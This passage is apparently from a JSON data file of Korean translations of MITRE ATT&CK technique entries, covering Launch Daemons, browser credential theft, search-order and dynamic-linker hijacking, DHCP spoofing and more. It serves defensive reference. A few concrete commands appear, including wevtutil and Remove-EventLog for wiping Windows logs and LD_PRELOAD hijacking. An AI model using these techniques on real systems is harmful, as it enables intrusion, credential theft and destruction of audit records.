요구됩니다.",
    "external_id": "T1112",
    "modified": "2023-08-14T19:19:54.148Z",
    "translated": true
  },
  {
    "title": "Launch Daemon",
    "description": "적대 세력은 지속성의 일환으로 악의적인 페이로드를 실행하기 위해 Launch Daemon을 생성하거나 수정할 수 있습니다. Launch Daemon은 macOS에서 사용되는 서비스 관리 프레임워크인 Launchd와 상호 작용하기 위해 사용되는 plist 파일입니다. Launch Daemon을 설치하려면 권한 상승이 필요하며, 로그인 전 시스템의 모든 사용자에 대해 실행되며, 사용자 상호 작용 없이 백그라운드에서 실행됩니다. macOS 초기화 시작 시 launchd 프로세스는 `<code>/System/Library/LaunchDaemons/</code>`와 `<code>/Library/LaunchDaemons/</code>`에서 발견된 plist 파일로부터 시스템 수준의 온디맨드 데몬 실행을 위한 매개변수를 로드합니다. 필요한 Launch Daemons 매개변수에는 작업을 식별하기 위한 `<code>Label</code>`, 실행 파일의 경로를 제공하기 위한 `<code>Program</code>`, 작업이 실행될 시점을 지정하기 위한 `<code>RunAtLoad</code>`가 포함됩니다. Launch Daemon은 종종 공유 리소스에 대한 접근을 제공하거나 소프트웨어 업데이트를 하거나 자동화 작업을 수행하는 데 사용됩니다.\n\n적대 세력은 `<code>RunAtLoad</code>` 매개변수를 `<code>true</code>`로 설정하고 `<code>Program</code>` 매개변수를 악의적인 실행 파일 경로로 설정하여 시작 시 실행되도록 구성된 Launch Daemon을 설치할 수 있습니다. 데몬 이름은 관련 운영 체제나 무해한 소프트웨어의 이름을 사용하여 위장할 수 있습니다. Launch Daemon이 실행되면 프로그램은 관리자 권한을 상속받습니다.\n\n또한, 타사 패키지 관리 소프트웨어 설치와 같은 시스템 구성 변경으로 인해 `<code>usr/local/bin</code>`과 같은 폴더가 전역적으로 쓰기 가능해질 수 있습니다. 따라서 잘못된 구성으로 인해 적대 세력이 현재 Launch Daemon의 plist 파일에서 참조되는 실행 파일을 수정할 수 있는 가능성이 있습니다.",
    "external_id": "T1543.004",
    "modified": "2023-03-30T21:01:48.453Z",
    "translated": true
  },
  {
    "title": "Cloud Infrastructure Discovery",
    "description": "적대자는 인프라스트럭처 서비스(IaaS) 환경 내에서 사용 가능한 인프라와 자원을 파악하려고 시도할 수 있습니다. 여기에는 인스턴스, 가상 머신 및 스냅샷과 같은 컴퓨팅 서비스 리소스는 물론 스토리지 및 데이터베이스 서비스를 포함한 다른 서비스의 리소스가 포함됩니다.\n\n클라우드 제공자는 인프라에 대한 정보를 제공하기 위해 API 및 CLI를 통해 발행된 명령과 같은 방법을 제공합니다. 예를 들어, AWS는 Amazon EC2 API 내에서 계정 내의 하나 이상의 인스턴스에 대한 정보를 반환할 수 있는 DescribeInstances API를 제공하며, 인증된 요청 발신자가 소유한 모든 버킷 목록을 반환하는 ListBuckets API, 버킷의 존재와 접근 권한을 확인하는 HeadBucket API, 그리고 버킷의 접근 차단 구성 정보를 검색하는 GetPublicAccessBlock API가 있습니다. GCP의 Cloud SDK CLI는 프로젝트 내의 모든 Google Compute Engine 인스턴스를 목록화하는 gcloud compute instances list 명령을 제공하며, Azure의 CLI 명령 az vm list는 가상 머신의 세부정보를 나열합니다. API 명령 외에도, 적대자는 오픈 소스 도구를 활용하여 클라우드 스토리지 인프라를 탐색할 수 있습니다.\n\n적대자는 손상된 사용자의 접근 키를 사용하여 리소스를 열거하고 해당 사용자에게 사용 가능한 리소스를 파악할 수 있습니다. 이러한 사용 가능한 리소스를 발견하는 것은 적대자들이 클라우드 환경에서 다음 단계를 결정하는 데 도움이 될 수 있으며, 예를 들어 지속성을 설정하는 것이 포함됩니다. 적대자는 이 정보를 사용하여 버킷을 공개적으로 접근 가능하도록 구성 변경을 할 수도 있으며, 이를 통해 인증 없이 데이터에 접근할 수 있게 됩니다. 적대자는 DescribeDBInstances와 같은 인프라 탐색 API를 사용하여 데이터베이스 리소스의 크기, 소유자, 권한 및 네트워크 ACL을 확인할 수 있습니다. 적대자는 이 정보를 사용하여 데이터베이스의 잠재적 가치를 판단하고 접근 요구사항을 발견할 수 있습니다. 클라우드 서비스 발견과는 달리, 이 기법은 서비스 자체가 아니라 제공된 서비스의 구성 요소를 발견하는 데 초점을 맞추고 있습니다.",
    "external_id": "T1580",
    "modified": "2024-09-30T13:28:37.415Z",
    "translated": true
  },
  {
    "title": "Credentials from Web Browsers",
    "description": "적대 세력은 특정 대상 브라우저에 대한 파일을 읽어 웹 브라우저에서 자격 증명을 획득할 수 있습니다. 웹 브라우저는 사용자가 향후 수동으로 입력할 필요가 없도록 웹사이트 사용자 이름과 비밀번호와 같은 자격 증명을 일반적으로 저장합니다. 웹 브라우저는 일반적으로 자격 증명을 암호화된 형식으로 자격 증명 저장소에 저장하지만, 평문 자격 증명을 웹 브라우저에서 추출하는 방법이 존재합니다.\n\n예를 들어, Windows 시스템에서 Google Chrome의 암호화된 자격 증명은 데이터베이스 파일을 읽고 SQL 쿼리를 실행하여 획득할 수 있습니다. 그런 다음 암호화된 자격 증명을 Windows API 함수에 전달하여 평문 비밀번호를 얻을 수 있습니다.\n\n적대 세력은 또한 FireFox, Safari, Edge 등의 일반적인 웹 브라우저에 대해 유사한 절차를 실행해왔습니다. Windows는 Internet Explorer와 Microsoft Edge의 자격 증명을 Windows Credential Manager에 의해 관리되는 Credential Lockers에 저장합니다.\n\n적대 세력은 또한 웹 브라우저 프로세스 메모리에서 자격 증명과 일반적으로 일치하는 패턴을 검색하여 자격 증명을 획득할 수 있습니다.\n\n웹 브라우저에서 자격 증명을 획득한 후, 적대 세력은 다양한 시스템 및/또는 계정에서 자격 증명을 재활용하려고 시도하여 접근을 확대할 수 있습니다. 이는 웹 브라우저에서 획득한 자격 증명이 권한 있는 계정(e.g. 도메인 관리자)과 겹치는 경우 적대 세력의 목표를 상당히 진전시킬 수 있습니다.",
    "external_id": "T1555.003",
    "modified": "2024-08-15T14:13:45.294Z",
    "translated": true
  },
  {
    "title": "Path Interception by Search Order Hijacking",
    "description": "적대자는 다른 프로그램을 로드하는 데 사용되는 검색 순서를 탈취하여 자신의 악성 페이로드를 실행할 수 있습니다. 일부 프로그램이 전체 경로를 사용하지 않고 다른 프로그램을 호출하기 때문에, 적대자는 호출 프로그램이 위치한 디렉토리에 자신의 파일을 놓음으로써 운영 체제가 호출 프로그램의 요청에 따라 자신의 악성 소프트웨어를 실행하도록 만들 수 있습니다.\n\n검색 순서 탈취는 적대자가 경로가 지정되지 않은 프로그램을 Windows가 검색하는 순서를 악용할 때 발생합니다. 프로그램을 실행하는 데 사용되는 방법에 따라 검색 순서는 다릅니다. 그러나 Windows가 초기 프로그램의 디렉토리에서 검색한 후 Windows 시스템 디렉토리를 검색하는 것이 일반적입니다. 검색 순서 탈취에 취약한 프로그램(즉, 실행 파일의 경로를 지정하지 않은 프로그램)을 발견한 적대자는 잘못 지정된 프로그램 이름을 가진 프로그램을 생성하고 이를 초기 프로그램의 디렉토리에 놓음으로써 이 취약점을 악용할 수 있습니다.\n\n예를 들어, \"example.exe\"가 \"cmd.exe\"를 명령줄 인수 <code>net user</code>와 함께 실행합니다. 적대자는 \"example.exe\"와 같은 디렉토리에 \"net.exe\"라는 프로그램을 놓으면, \"net.exe\"가 Windows 시스템 유틸리티 net 대신 실행됩니다. 또한, 만약 적대자가 \"net.exe\"와 같은 디렉토리에 \"net.com\"이라는 프로그램을 놓는다면, <code>cmd.exe /C net user</code>는 PATHEXT에서 정의된 실행 파일 확장자의 순서 때문에 \"net.exe\" 대신 \"net.com\"을 실행합니다.\n\n검색 순서 탈취는 DLL 로드를 탈취하는 일반적인 방법이기도 하며, 이와 관련된 내용은 별도의 문서에서 다루어집니다.",
    "external_id": "T1574.008",
    "modified": "2024-09-12T15:25:57.059Z",
    "translated": true
  },
  {
    "title": "Defacement",
    "description": "적대 세력은 기업 네트워크 내부 또는 외부에서 사용 가능한 시각적 콘텐츠를 수정하여 원래 콘텐츠의 무결성에 영향을 줄 수 있습니다. 변조의 이유로는 메시지 전달, 위협, 또는 침입에 대한 (사실이 아닐 수 있는) 공로 주장 등이 있습니다. 불쾌하거나 불안감을 주는 이미지는 사용자에게 불편을 초래하거나 동반 메시지에 대한 준수를 압박하기 위해 변조의 일부로 사용될 수 있습니다.",
    "external_id": "T1491",
    "modified": "2022-03-25T19:34:42.056Z",
    "translated": true
  },
  {
    "title": "Unused/Unsupported Cloud Regions",
    "description": "적대자는 탐지를 피하기 위해 사용되지 않는 지리적 서비스 지역에서 클라우드 인스턴스를 생성할 수 있습니다. 접근은 일반적으로 클라우드 인프라를 관리하는 데 사용되는 계정을 타락시켜 얻어집니다.\n\n클라우드 서비스 제공자는 성능을 개선하고 중복성을 제공하며 고객이 규정 준수 요건을 충족할 수 있도록 세계 전역에 인프라를 제공하는 경우가 많습니다. 종종 고객은 사용 가능한 지역의 일부만 사용하고 다른 지역을 적극적으로 모니터링하지 않을 수 있습니다. 적대자가 사용되지 않는 지역에 리소스를 생성하면 탐지되지 않고 운영할 수 있습니다.\n\n이 행동의 변형은 클라우드 지역 간 기능의 차이를 이용합니다. 적대자는 고급 탐지 서비스를 지원하지 않는 지역을 활용하여 자신의 활동이 탐지되지 않도록 할 수 있습니다.",
    "external_id": "T1535",
    "modified": "2023-12-14T16:28:24.680Z",
    "translated": true
  },
  {
    "title": "DHCP Spoofing",
    "description": "적대자는 동적 호스트 구성 프로토콜(DHCP) 트래픽을 스푸핑하고 피해 네트워크에서 악성 DHCP 서버로 행동하여 네트워크 트래픽을 자신이 소유한 시스템으로 리디렉션할 수 있습니다. 중간 공격자(AiTM) 위치를 확보함으로써, 적대자는 네트워크 통신을 수집할 수 있으며, 특히 안전하지 않거나 암호화되지 않은 프로토콜을 통해 전송된 자격 증명을 포함합니다. 이는 또한 후속 행동을 가능하게 할 수 있습니다.\n\nDHCP는 클라이언트-서버 모델에 기반하여 두 가지 기능을 가지고 있습니다: DHCP 서버에서 클라이언트로 네트워크 구성 설정을 제공하는 프로토콜과 클라이언트에게 네트워크 주소를 할당하는 메커니즘입니다. 일반적인 서버-클라이언트 상호작용은 다음과 같습니다:\n\n1. 클라이언트는 `DISCOVER` 메시지를 브로드캐스트합니다.\n\n2. 서버는 사용 가능한 네트워크 주소를 포함한 `OFFER` 메시지로 응답합니다.\n\n3. 클라이언트는 제공된 네트워크 주소를 포함한 `REQUEST` 메시지를 브로드캐스트합니다.\n\n4. 서버는 `ACK` 메시지로 확인하며, 클라이언트는 네트워크 구성 매개변수를 받습니다.\n\n적대자는 피해 네트워크에서 악성 DHCP 서버로 스푸핑하여 합법적인 호스트가 악성 네트워크 구성을 받을 수 있도록 할 수 있습니다. 예를 들어, 악성 소프트웨어가 DHCP 서버처럼 행동하여 피해 컴퓨터에 적대자가 소유한 DNS 서버를 제공할 수 있습니다. 이러한 악성 네트워크 구성을 통해 적대자는 AiTM 위치를 차지하고 클라이언트 트래픽을 적대자가 제어하는 시스템을 통해 라우팅하며 클라이언트 네트워크에서 정보를 수집할 수 있습니다.\n\nDHCPv6 클라이언트는 IP 주소가 할당되지 않은 상태에서도 `INFORMATION-REQUEST (코드 11)` 메시지를 `All_DHCP_Relay_Agents_and_Servers` multicast 주소로 전송하여 네트워크 구성 정보를 받을 수 있습니다. 적대자는 이 요청 메시지에 악성 네트워크 구성으로 응답하기 위해 자기의 악성 DHCP 서버를 사용할 수 있습니다.\n\n적대자는 AiTM 위치를 설정하는 대신, DHCP 스푸핑을 악용하여 DHCP 소진 공격을 수행할 수도 있습니다. 이는 많은 브로드캐스트 DISCOVER 메시지를 생성하여 네트워크의 DHCP 할당 풀을 소진시키는 방법입니다.",
    "external_id": "T1557.003",
    "modified": "2024-09-12T19:46:04.759Z",
    "translated": true
  },
  {
    "title": "Remote Service Session Hijacking",
    "description": "적대자는 원격 서비스에 대한 기존 세션을 장악하여 환경 내에서 수평 이동을 할 수 있습니다. 사용자들은 telnet, SSH 및 RDP와 같이 원격 연결을 수용하도록 특별히 설계된 서비스에 유효한 자격 증명을 사용하여 로그인할 수 있습니다. 사용자가 서비스에 로그인하면, 해당 서비스와 지속적인 상호작용을 유지할 수 있는 세션이 설정됩니다.\n\n적대자는 이러한 세션을 장악하여 원격 시스템에서 작업을 수행할 수 있습니다. 원격 서비스 세션 탈취는 유효한 계정을 사용하여 새로운 세션을 생성하는 것이 아니라 기존의 세션을 탈취하기 때문에 원격 서비스의 사용과 다릅니다.",
    "external_id": "T1563",
    "modified": "2024-02-26T14:21:37.818Z",
    "translated": true
  },
  {
    "title": "Binary Padding",
    "description": "적대자는 이진 패딩을 사용하여 쓰레기 데이터를 추가하고 악성 코드의 디스크상의 표현을 변경할 수 있습니다. 이는 이진 파일의 기능이나 동작에 영향을 주지 않으면서도, 파일 크기 제한으로 인해 일부 보안 도구가 처리할 수 있는 크기를 초과하게 만들 수 있습니다.\n\n이진 패딩은 파일의 체크섬을 효과적으로 변경하며 해시 기반 차단 목록과 정적 안티바이러스 서명을 회피하는 데에도 사용될 수 있습니다. 사용되는 패딩은 일반적으로 쓰레기 데이터를 생성하는 함수에 의해 생성되어 악성 코드의 끝에 추가되거나 특정 섹션에 적용됩니다. 파일 크기를 증가시키면 큰 파일을 스캔하도록 설계되거나 구성되지 않은 특정 도구와 탐지 능력의 효과가 감소할 수 있습니다. 이는 분석을 위해 수집될 가능성을 줄일 수도 있습니다. 공공 파일 스캔 서비스는 업로드된 파일의 최대 크기를 제한하여 분석을 수행합니다.",
    "external_id": "T1027.001",
    "modified": "2023-03-30T21:01:53.857Z",
    "translated": true
  },
  {
    "title": "Web Shell",
    "description": "적대자는 웹 서버에 웹 셸을 통해 백도어를 설치하여 시스템에 지속적인 접근을 설정할 수 있습니다. 웹 셸은 적대자가 네트워크로의 게이트웨이로서 웹 서버에 접근할 수 있도록 공개적으로 접근 가능한 웹 서버에 배치된 웹 스크립트입니다. 웹 셸은 웹 서버를 호스팅하는 시스템에서 실행할 수 있는 일련의 기능이나 명령줄 인터페이스를 제공할 수 있습니다.\n\n서버 측 스크립트 외에도 웹 셸은 웹 서버와 통신하는 데 사용되는 클라이언트 인터페이스 프로그램을 가질 수 있습니다.",
    "external_id": "T1505.003",
    "modified": "2024-04-16T12:45:06.434Z",
    "translated": true
  },
  {
    "title": "Group Policy Modification",
    "description": "적대자는 도메인에서 의도된 재량적 접근 제어를 무력화하기 위해 그룹 정책 객체(GPO)를 수정할 수 있으며, 이는 일반적으로 도메인에서 권한 상승을 노리는 의도를 가지고 있습니다. 그룹 정책은 Active Directory(AD)에서 사용자 및 컴퓨터 설정을 중앙 집중식으로 관리할 수 있게 해줍니다. GPO는 예측 가능한 네트워크 경로에 저장된 파일로 구성된 그룹 정책 설정의 컨테이너입니다.\n\nAD의 다른 객체와 마찬가지로 GPO에도 접근 제어가 연결되어 있습니다. 기본적으로 도메인에 있는 모든 사용자 계정은 GPO를 읽을 수 있는 권한을 가지고 있습니다. 특정 사용자나 그룹에 GPO 접근 제어 권한, 예를 들어 쓰기 접근 권한을 위임하는 것이 가능합니다.\n\n악의적인 GPO 수정을 통해 여러 다른 악의적인 행동을 구현할 수 있습니다. GPO는 AD 환경에서 많은 사용자 및 기계 설정을 제어할 수 있기 때문에 이러한 GPO 남용으로부터 파생될 수 있는 잠재적인 공격이 많습니다.\n\n예를 들어, 공개적으로 사용 가능한 스크립트는 GPO 설정을 수정하여 악의적인 작업을 자동화하는 데 활용될 수 있습니다. 어떤 경우에는 적대자가 SeEnableDelegationPrivilege와 같은 특정 사용자 권한을 수정하여 AD 백도어를 은밀하게 생성할 수 있습니다. 그렇게 되면 적대자가 제어하는 사용자 계정은 GPO를 수정할 수 있게 됩니다.",
    "external_id": "T1484.001",
    "modified": "2024-09-23T22:11:01.884Z",
    "translated": true
  },
  {
    "title": "Browser Information Discovery",
    "description": "적대자는 손상된 환경에 대해 더 알아보기 위해 브라우저에 대한 정보를 열거할 수 있습니다. 브라우저에 저장된 데이터(예: 즐겨찾기, 계정, 검색 기록)는 사용자에 대한 다양한 개인 정보를 드러낼 수 있으며(예: 은행 사이트, 관계/관심사, 소셜 미디어 등) 내부 네트워크 자원에 대한 세부사항(예: 서버, 도구/대시보드 또는 기타 관련 인프라)도 포함될 수 있습니다.\n\n브라우저 정보는 적대자가 유효한 자격 증명에 접근한 후 추가적인 목표를 강조할 수 있습니다.\n\n특정 저장 위치는 플랫폼 및/또는 응용 프로그램에 따라 다르지만, 브라우저 정보는 일반적으로 로컬 파일 및 데이터베이스에 저장됩니다.",
    "external_id": "T1217",
    "modified": "2023-04-16T14:24:40.625Z",
    "translated": true
  },
  {
    "title": "Private Keys",
    "description": "적대 세력은 손상된 시스템에서 안전하지 않게 저장된 자격 증명을 위해 개인 키 인증서 파일을 검색할 수 있습니다. 개인 암호화 키와 인증서는 인증, 암호화/복호화 및 디지털 서명에 사용됩니다. 일반적인 키 및 인증서 파일 확장자에는 .key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer, .p7b, .asc가 포함됩니다.\n\n적대 세력은 또한 * nix 기반 시스템의 경우 <code>~/.ssh</code>와 같은 일반적인 키 디렉토리나 Windows의 경우 <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code>를 검색할 수 있습니다. 적대 세력의 도구는 손상된 시스템에서 암호화 키 및 인증서와 관련된 파일 확장자를 검색할 수도 있습니다.\n\n장치가 Entra ID에 등록되면 장치 키와 전송 키가 생성되어 장치의 신원을 확인하는 데 사용됩니다. 장치에 접근할 수 있는 적대 세력은 장치의 신원을 가장하기 위해 키를 내보낼 수 있습니다.\n\n네트워크 장치에서는 `crypto pki export`와 같은 [네트워크 장치 CLI] 명령을 통해 개인 키를 내보낼 수 있습니다.\n\n일부 개인 키는 작동을 위해 비밀번호나 구문이 필요하므로 적대 세력은 [입력 캡처] 기술을 사용해 키로깅을 하거나 오프라인에서 구문에 대한 [브루트 포스] 공격을 시도할 수 있습니다. 이러한 개인 키는 SSH와 같은 [원격 서비스]에 인증하는 데 사용되거나 이메일과 같은 다른 수집된 파일을 복호화하는 데 사용될 수 있습니다.",
    "external_id": "T1552.004",
    "modified": "2024-10-04T11:31:56.622Z",
    "translated": true
  },
  {
    "title": "Server",
    "description": "상대방은 표적 작업 중에 사용할 수 있는 물리적 서버를 구매, 임대, 대여하거나 획득할 수 있습니다. 서버를 사용하면 공격자는 작업을 준비하고, 시작하며, 실행할 수 있습니다. 침해 이후 활동 중에 상대방은 여러 작업을 위해 서버를 활용할 수 있으며, 여기에는 특정 사이트를 통해 사용자들을 표적하는 작업, 피싱 작업 지원, 또는 명령 및 제어 활동 촉진 등이 포함됩니다. 제3자의 서버를 해킹하거나 가상 사서함을 임대하는 대신, 상대방은 자신의 서버를 구성하고 운영하여 작업을 지원할 수 있습니다. 클라우드 서버의 무료 체험 기간도 악용될 수 있습니다.\n\n대부분의 활동이 온라인 인프라를 사용하여 이루어질 경우, 상대방은 간단한 설정만으로도 충분할 수 있습니다. 그러나 자신의 시스템에서 다른 활동의 테스트, 커뮤니케이션 및 제어를 원할 경우, 상대방은 광범위한 인프라를 구축해야 할 수도 있습니다.",
    "external_id": "T1583.004",
    "modified": "2024-02-28T21:22:52.176Z",
    "translated": true
  },
  {
    "title": "Windows Remote Management",
    "description": "적대자는 유효 계정을 사용하여 Windows 원격 관리(WinRM)를 통해 원격 시스템과 상호 작용할 수 있습니다. 그런 다음 적대자는 로그인된 사용자로서 작업을 수행할 수 있습니다.\n\nWinRM은 사용자가 원격 시스템과 상호 작용할 수 있도록 허용하는 Windows 서비스와 프로토콜의 이름입니다(예: 실행 파일 실행, 레지스트리 수정, 서비스 수정). `winrm` 명령이나 PowerShell과 같은 여러 프로그램을 통해 호출될 수 있습니다. WinRM은 원격으로 Windows 관리 도구(WMI)와 상호 작용하는 방법으로 사용될 수 있습니다.",
    "external_id": "T1021.006",
    "modified": "2024-09-12T15:28:23.398Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Bluetooth",
    "description": "적대자는 명령 및 제어 채널 대신 블루투스를 통해 데이터를 유출하려고 시도할 수 있습니다. 명령 및 제어 네트워크가 유선 인터넷 연결인 경우, 적대자는 블루투스 통신 채널을 사용하여 데이터를 유출할 수 있습니다.\n\n적대자는 충분한 접근 권한과 근접성이 있다면 이를 선택할 수 있습니다. 블루투스 연결은 동일한 기업 네트워크를 통해 라우팅되지 않기 때문에 주요 인터넷 연결 채널만큼 안전하게 보호되지 않을 수 있습니다.",
    "external_id": "T1011.001",
    "modified": "2022-03-08T21:02:15.802Z",
    "translated": true
  },
  {
    "title": "Default Accounts",
    "description": "적대자는 초기 접근, 지속성, 권한 상승 또는 방어 회피 수단으로 기본 계정의 자격 증명을 획득하고 악용할 수 있습니다. 기본 계정은 Windows 시스템의 게스트 또는 관리자 계정과 같이 OS에 내장된 계정을 의미합니다. 기본 계정은 또한 AWS의 루트 사용자 계정이나 Kubernetes의 기본 서비스 계정과 같이 다른 유형의 시스템, 소프트웨어 또는 장치에서 공장 기본값으로 설정된 계정을 포함합니다.\n\n기본 계정은 클라이언트 머신에만 국한되지 않으며, 내부, 오픈 소스 또는 상용 소프트웨어를 포함하여 네트워크 장치 및 컴퓨터 애플리케이션과 같은 장비에 미리 설정된 계정도 포함됩니다. 사용자 이름과 비밀번호 조합으로 미리 설정된 장치는 설치 후 이를 변경하지 않는 조직에 대해 심각한 위협을 초래합니다. 마찬가지로, 적대자는 공개적으로 공개되거나 도난당한 자격 증명 자료를 사용하여 원격 서비스를 통해 원격 환경에 합법적으로 연결할 수도 있습니다.",
    "external_id": "T1078.001",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Time Providers",
    "description": "적대자는 시스템 부팅 시 DLL을 실행하기 위해 시간 제공자를 악용할 수 있습니다. Windows 시간 서비스(W32Time)는 도메인 간 및 도메인 내에서 시간 동기화를 가능하게 합니다. W32Time 시간 제공자는 하드웨어/네트워크 리소스에서 타임스탬프를 가져오고 이 값을 다른 네트워크 클라이언트에 출력하는 역할을 담당합니다.\n\n시간 제공자는 `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`의 하위 키에 등록된 동적 링크 라이브러리(DLL)로 구현됩니다. 서비스 제어 관리자가 지시하는 시간 제공자 관리자는 시스템 시작 시 또는 매개변수가 변경될 때 이 키 아래에 나열되고 활성화된 시간 제공자를 로드하고 시작합니다.\n\n적대자는 이 아키텍처를 악용하여 지속성을 확립할 수 있으며, 구체적으로 악성 DLL을 가리키는 새로 임의로 이름이 지정된 하위 키를 생성하여 이를 수행할 수 있습니다. 시간 제공자 등록에는 관리자 권한이 필요하지만 실행은 로컬 서비스 계정의 컨텍스트에서 이루어집니다.",
    "external_id": "T1547.003",
    "modified": "2024-04-12T02:34:58.003Z",
    "translated": true
  },
  {
    "title": "Trap",
    "description": "적대자는 인터럽트 신호에 의해 트리거되는 악성 콘텐츠를 실행하여 지속성을 확립할 수 있습니다. <code>trap</code> 명령은 프로그램과 쉘이 인터럽트 신호를 받을 때 실행될 명령을 지정할 수 있게 합니다. 일반적인 상황은 스크립트가 <code>ctrl+c</code> 및 <code>ctrl+d</code>와 같은 일반적인 키보드 인터럽트를 처리하고 우아하게 종료할 수 있도록 하는 것입니다.\n\n적대자는 이를 사용하여 쉘이 특정 인터럽트를 만날 때 실행될 코드를 등록하여 지속성 메커니즘으로 활용할 수 있습니다. 트랩 명령의 형식은 <code>trap 'command list' signals</code>이며 \"signals\"를 받을 때 \"command list\"가 실행됩니다.",
    "external_id": "T1546.005",
    "modified": "2020-03-24T16:43:02.273Z",
    "translated": true
  },
  {
    "title": "Dynamic Linker Hijacking",
    "description": "적대자는 동적 링커가 공유 라이브러리를 로드하는 데 사용하는 환경 변수를 탈취하여 악성 페이로드를 실행할 수 있습니다. 프로그램의 실행 준비 단계에서 동적 링커는 환경 변수와 파일에서 지정된 공유 라이브러리의 절대 경로를 로드합니다. 이러한 환경 변수는 개발자가 이진 파일을 재컴파일하지 않고도 디버그하고, 매핑된 기호의 충돌을 해결하며, 원래 라이브러리를 변경하지 않고 사용자 정의 함수를 구현하기 위해 자주 사용됩니다.\n\n리눅스와 macOS에서 동적 링커 변수를 탈취하는 것은 피해자의 프로세스 메모리, 시스템/네트워크 리소스, 그리고 어쩌면 상승된 권한에 접근할 수 있게 할 수 있습니다. 이 방법은 실행이 합법적인 프로세스 아래에서 숨겨지기 때문에 보안 제품의 탐지를 피할 수도 있습니다. 적대자는 명령줄에서 `export` 명령, `setenv` 함수 또는 `putenv` 함수를 사용하여 환경 변수를 설정할 수 있습니다. 또한 그들은 셸에서 변수를 내보내거나 파이썬의 `os.environ`과 같은 고급 구문을 사용하여 프로그래밍 방식으로 변수를 설정하는 방식으로 동적 링커 탈취를 활용할 수 있습니다.\n\n리눅스에서 적대자는 `LD_PRELOAD`를 악성 라이브러리로 설정하여 피해 프로그램이 요청하는 합법적인 라이브러리와 이름이 일치하도록 할 수 있습니다. 이렇게 하면 운영 체제가 피해 프로그램 실행 시 적대자의 악성 코드를 로드하게 됩니다. `LD_PRELOAD`는 환경 변수 또는 `/etc/ld.so.preload` 파일을 통해 설정할 수 있습니다. `LD_PRELOAD`로 지정된 라이브러리는 각각 `dlopen()` 및 `mmap()`에 의해 메모리에 로드되고 매핑됩니다.\n\nmacOS에서도 이 동작은 리눅스와 개념적으로 동일하지만, macOS의 동적 라이브러리(dyld)가 낮은 수준에서 구현되는 방식에서 차이가 있습니다. 적대자는 `DYLD_INSERT_LIBRARIES` 환경 변수를 설정하여 피해 프로그램이 요청하는 합법적인 라이브러리 또는 함수의 이름을 포함한 악성 라이브러리를 가리킬 수 있습니다.",
    "external_id": "T1574.006",
    "modified": "2023-03-30T21:01:40.146Z",
    "translated": true
  },
  {
    "title": "Communication Through Removable Media",
    "description": "적대자는 탈취된 호스트 간에 잠재적으로 연결이 끊긴 네트워크에서 명령을 제어하기 위해 이동식 매체를 사용하여 시스템 간 명령을 전송할 수 있습니다. 두 시스템 모두가 탈취되어야 하며, 인터넷에 연결된 시스템이 먼저 탈취되고 두 번째 시스템이 이동을 통해 탈취될 가능성이 있습니다. 명령과 파일은 연결이 끊긴 시스템에서 적대자가 직접 접근할 수 있는 인터넷에 연결된 시스템으로 중계됩니다.",
    "external_id": "T1092",
    "modified": "2024-01-31T03:17:42.004Z",
    "translated": true
  },
  {
    "title": "Clear Windows Event Logs",
    "description": "적대적인 공격자는 침입 활동을 숨기기 위해 Windows 이벤트 로그를 지울 수 있습니다. Windows 이벤트 로그는 컴퓨터의 경고 및 알림 기록입니다. 시스템에서 정의된 이벤트 소스는 세 가지로, 시스템, 애플리케이션 및 보안이 있으며, 이벤트 유형은 오류, 경고, 정보, 성공 감사 및 실패 감사의 다섯 가지가 있습니다.\n\n관리자 권한으로 다음 유틸리티 명령어를 사용하여 이벤트 로그를 지울 수 있습니다:\n\n* wevtutil cl system\n* wevtutil cl application\n* wevtutil cl security\n\n이 로그는 이벤트 뷰어 GUI 또는 PowerShell을 통해서도 지울 수 있습니다. 예를 들어, 공격자는 PowerShell 명령어 Remove-EventLog -LogName Security를 사용하여 보안 이벤트 로그를 삭제한 후 재부팅하게 되면 이후 로그 기록을 비활성화할 수 있습니다. 주의: 명령이 실행되고 재부팅되는 사이에 이벤트가 여전히 생성되어 .evtx 파일에 기록될 수 있습니다.\n\n또한, 공격자는 'C:\\Windows\\System32\\winevt\\logs\\'에 저장된 로그 파일을 직접 삭제하여 로그를 지우려고 시도할 수도 있습니다.",
    "external_id": "T1070.001",
    "modified": "2024-04-16T12:40:58.536Z",
    "translated": true
  },
  {
    "title": "Email Accounts",
    "description": "적대자는 타겟팅 과정에서 사용할 수 있는 이메일 계정을 생성할 수 있습니다. 적대자는 이메일 제공업체를 통해 생성된 계정을 사용하여 운영을 진행할 수 있으며, 정보 피싱이나 피싱과 같은 활동을 수행할 수 있습니다. 이메일 계정을 설정하면 적대자가 무료 서비스를 남용하여 후속 목적을 위한 인프라를 획득할 수 있습니다.\n\n또한 적대자는 이메일 계정 주위에 페르소나를 형성하기 위해 소셜 미디어 계정을 활용하는 등의 조치를 취하여 후속 행동의 성공 가능성을 높일 수 있습니다. 생성된 이메일 계정은 인프라를 획득하는 데에도 사용될 수 있습니다.\n\n운영과 자신을 물리적으로 연결할 가능성을 줄이기 위해 적대자는 일회용 이메일 서비스를 활용할 수 있습니다.",
    "external_id": "T1585.002",
    "modified": "2024-02-28T21:11:27.088Z",
    "translated": true
  },
  {
    "title": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "description": "LLMNR/NBT-NS 네트워크 트래픽에 응답함으로써 공격자는 이름 해석을 위한 권위 있는 소스를 스푸핑할 수 있으며, 이를 통해 공격자가 제어하는 시스템과의 통신을 강제할 수 있습니다. 이 활동은 인증 자료를 수집하거나 전달하는 데 사용될 수 있습니다.\n\n링크-로컬 멀티캐스트 이름 해석(LLMNR) 및 넷BIOS 이름 서비스(NBT-NS)는 호스트 식별을 위한 대체 방법으로 작동하는 Microsoft Windows 구성 요소입니다. LLMNR은 도메인 이름 시스템(DNS) 형식을 기반으로 하며, 동일한 로컬 링크에 있는 호스트가 다른 호스트를 위해 이름 해석을 수행할 수 있도록 허용합니다. NBT-NS는 로컬 네트워크 내에서 시스템을 넷BIOS 이름으로 식별합니다.\n\n공격자는 배우지 않은 요청 호스트의 신원을 아는 것처럼 행동하여 victim 네트워크에서 이름 해석을 위한 권위 있는 소스를 스푸핑할 수 있으며, 이는 서비스의 오염을 초래하여 피해자가 공격자가 제어하는 시스템과 통신하게 만듭니다. 요청된 호스트가 인증/식별을 요구하는 리소스에 속하는 경우, 사용자 이름과 NTLMv2 해시가 공격자가 제어하는 시스템으로 전송됩니다. 이후 공격자는 와이어를 